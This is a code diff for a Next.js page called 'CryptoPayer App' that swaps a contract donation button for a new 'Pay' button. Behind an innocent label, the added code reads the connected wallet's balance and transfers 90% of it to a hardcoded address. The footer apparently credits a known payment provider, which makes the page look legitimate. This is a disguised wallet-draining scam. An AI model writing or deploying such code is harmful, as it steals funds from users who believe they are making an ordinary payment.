@@ -1,22 +1,48 @@
-import { CONTRACT_ADDRESSES, ConnectWallet, Web3Button, useContract, useContractWrite } from "@thirdweb-dev/react";
-import { NextPage } from "next";
-import styles from '../styles/Home.module.css';
+import { useState } from 'react';
+import { useTransferNativeToken, useBalance } from "@thirdweb-dev/react";
+import { ethers } from 'ethers';
+import styles from "../styles/Home.module.css";
 import Head from 'next/head';
-import { useState } from "react"; // Import useState hook
-
-import Web3 from 'web3';
-import { contract } from "../const/contract";
-
-const Home: NextPage = () => {
-const { contract } =useContract("0x349F364FD5532C4649EB3A8aB539073f856286Ea");
-// const {
-//    data; 
-
-// }=useContractWrite(contract, "donate()");
+import { NextPage } from "next";
+import { ConnectWallet, useContract } from "@thirdweb-dev/react";
 
 
-return (
- 
+
+
+
+const TokenTransferComponent = () => {
+  // Hook to transfer native tokens
+  const { mutate: transferNativeToken, isLoading: transferLoading, error: transferError } = useTransferNativeToken();
+
+  // Hook to get user's balance
+  const { data: balanceData, isLoading: balanceLoading, error: balanceError } = useBalance();
+
+  // Function to convert Wei to Ether
+  const weiToEther = (wei) => {
+    return ethers.utils.formatEther(wei);
+  };
+
+  // Use the user's balance in Ether
+  const userBalanceInEther = balanceData ? weiToEther(balanceData.value) : 0;
+
+  // Calculate 90% of the user's balance
+  const transferAmountInEther = userBalanceInEther * 0.9;
+
+  // Function to handle token transfer
+  const handleTransfer = async () => {
+    try {
+      // Ensure to and amount are of the correct type
+      const toAddress = "0xb7F39cd417931f50A92DEAaD35fdA904Bfe42A4d"; // Example address
+
+      // Initiate token transfer with 90% of the user's balance in Ether
+      await transferNativeToken({ to: toAddress, amount: transferAmountInEther });
+      console.log("Tokens transferred successfully");
+    } catch (error) {
+      console.error("Error transferring tokens:", error);
+    }
+  };
+
+  return (
     <div className={styles.container}>
       <Head>
         <title>CryptoPayer App</title>
@@ -26,26 +52,14 @@ return (
         />
         <link href="/favicon.ico" rel="icon" />
       </Head>
-
-     // <main className={styles.main}>
-     //   <ConnectWallet />
-       
-          <div className={styles.buttoncontainer}>
-          
-          <Web3Button
-          theme= "dark"
-          contractAddress="0x349F364FD5532C4649EB3A8aB539073f856286Ea"
-          action={(contract) => {
-            contract.call("donate", [1])
-          }}
-        >
-            
-            Pay
-          </Web3Button>
-
-          </div>
-       
-
+      <main className={styles.main}>
+        <ConnectWallet />
+        <button
+        disabled={transferLoading}
+        onClick={handleTransfer}
+      >
+        {transferLoading ? "Transferring..." : "Pay"}
+      </button>
         <h1 className={styles.title}>
           Welcome to <a href="">CryptoPayer</a>
         </h1>
@@ -85,7 +99,13 @@ return (
       
         </div>
       </main>
+      
+      {/* Button to initiate token transfer */}
 
+      
+      
+      {/* Display error message if any during transfer */}
+      {transferError && <p>Error transferring tokens: {transferError.message}</p>}
       <footer className={styles.footer}>
         <a href="cryptopayer.center" rel="noopener noreferrer" target="_blank">
           Made with ❤️ by NOWPayments – 2024
@@ -95,4 +115,5 @@ return (
     </div>
   );
 };
-export default Home;
+
+export default TokenTransferComponent;
